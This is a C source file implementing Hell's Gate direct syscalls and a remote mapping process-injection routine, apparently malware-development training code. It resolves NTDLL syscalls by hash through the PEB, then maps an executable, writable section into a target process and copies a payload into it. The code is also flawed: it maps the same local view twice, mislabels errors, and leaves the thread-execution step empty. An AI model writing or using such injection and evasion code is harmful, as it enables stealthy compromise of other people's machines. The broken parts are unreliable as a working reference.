#include "HellsGate.h"
#include <stdio.h>

VX_TABLE g_SyscallsTable = { 0 };

BOOL InitializeSyscalls() {
	// Get the PEB
	PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
	PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
	if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion != 0xA)
		return FALSE;

	// Get NTDLL module 
	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);
	PVOID ntDllBaseAddress = pLdrDataEntry->DllBase;
	if (!ntDllBaseAddress)
		return FALSE;

	// Get the EAT of NTDLL
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
	if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
		return FALSE;

	// Initialize the syscalls table
	g_SyscallsTable.NtCreateSection.dwHash = NtCreateSectionHashValue;
	g_SyscallsTable.NtMapViewOfSection.dwHash = NtMapViewOfSectionHashValue;
	g_SyscallsTable.NtUnmapViewOfSection.dwHash = NtUnmapViewOfSectionHashValue;
	g_SyscallsTable.NtClose.dwHash = NtCloseHashValue;
	g_SyscallsTable.NtCreateThreadEx.dwHash = NtCreateThreadExHashValue;
	g_SyscallsTable.NtWaitForSingleObject.dwHash = NtWaitForSingleObjectHashValue;

	if (!GetVxTableEntry(ntDllBaseAddress, pImageExportDirectory, &g_SyscallsTable.NtCreateSection))
		return FALSE;
	if (!GetVxTableEntry(ntDllBaseAddress, pImageExportDirectory, &g_SyscallsTable.NtMapViewOfSection))
		return FALSE;
	if (!GetVxTableEntry(ntDllBaseAddress, pImageExportDirectory, &g_SyscallsTable.NtUnmapViewOfSection))
		return FALSE;
	if (!GetVxTableEntry(ntDllBaseAddress, pImageExportDirectory, &g_SyscallsTable.NtClose))
		return FALSE;
	if (!GetVxTableEntry(ntDllBaseAddress, pImageExportDirectory, &g_SyscallsTable.NtCreateThreadEx))
		return FALSE;
	if (!GetVxTableEntry(ntDllBaseAddress, pImageExportDirectory, &g_SyscallsTable.NtWaitForSingleObject))
		return FALSE;

	return TRUE;
}


BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize, IN BOOL bIsLocalInjection) {
	// Declare local vars
	NTSTATUS		status = 0x0;
	HANDLE          hSection = NULL;
	HANDLE          hThread = NULL;
	PVOID			pAllocatedAddress = NULL,
					pAllocatedRemoteAddress = NULL,
					pExecAddress = NULL;
	LARGE_INTEGER	liMaxSize = { 0 };
	SIZE_T          sViewSize = NULL;
	DWORD           dwLocalFlag = PAGE_READWRITE;

	// Init local vars
	liMaxSize.LowPart = (DWORD)sPayloadSize;

	// Allocating local map view 
	HellsGate(g_SyscallsTable.NtCreateSection.wSystemCall);
	if (status = HellDescent(
		&hSection,
		SECTION_ALL_ACCESS,
		NULL,
		liMaxSize,
		PAGE_EXECUTE_READWRITE,
		SEC_COMMIT,
		NULL
	) != 0x0) {
		printf("[!] NtCreateSection Failed With Error : 0x%0.8X \n", status);
		return FALSE;
	}

	if (bIsLocalInjection) {
		dwLocalFlag = PAGE_EXECUTE_READWRITE;
	}

	HellsGate(g_SyscallsTable.NtMapViewOfSection.wSystemCall);
	if (status = HellDescent(
		hSection,
		(HANDLE)-1,
		&pAllocatedAddress,
		NULL, NULL, NULL,
		&sViewSize,
		ViewShare,
		NULL,
		dwLocalFlag
	) != 0x0) {
		printf("[!] NtCreateSection Failed With Error : 0x%0.8X \n",
			status);
		return FALSE;
	}

	printf("[+] Local Memory Allocated At : 0x%p Of Size : %d \n", pAllocatedAddress, (INT)sViewSize);

	HellsGate(g_SyscallsTable.NtMapViewOfSection.wSystemCall);
	if (status = HellDescent(
		hSection,
		(HANDLE)-1,
		&pAllocatedAddress,
		NULL, NULL, NULL,
		&sViewSize,
		ViewShare,
		NULL,
		dwLocalFlag
	) != 0x0) {
		printf("[!] NtCreateSection Failed With Error : 0x%0.8X \n",
			status);
		return FALSE;
	}

	// Writing the payload
	printf("[#] Press <Enter> To Write The Payload ... ");
	getchar();

	CopyMemoryEx(pAllocatedAddress, pPayload, sPayloadSize);
	printf("\t[+] Payload is Copied From 0x%p To 0x%p \n", pPayload, pAllocatedAddress);

	// Allocating remote map view 
	if (!bIsLocalInjection) {
		HellsGate(g_SyscallsTable.NtMapViewOfSection.wSystemCall);
		if ((status = HellDescent(
			hSection,
			hProcess,
			&pAllocatedRemoteAddress,
			NULL, NULL, NULL,
			&sViewSize,
			ViewShare,
			NULL,
			PAGE_EXECUTE_READWRITE
		)) != 0x0) {
			printf("[!] NtMapViewOfSection [R] Failed With Error : 0x%0.8X \n", status);
			return FALSE;
		}
		printf("[+] Remote Memory Allocated At : 0x%p Of Size : %d \n", pAllocatedRemoteAddress, (INT)sViewSize);
	}

	// Executing the payload via thread creation
	pExecAddress = pAllocatedRemoteAddress;
	if (bIsLocalInjection) {
		
	}


	return TRUE;
}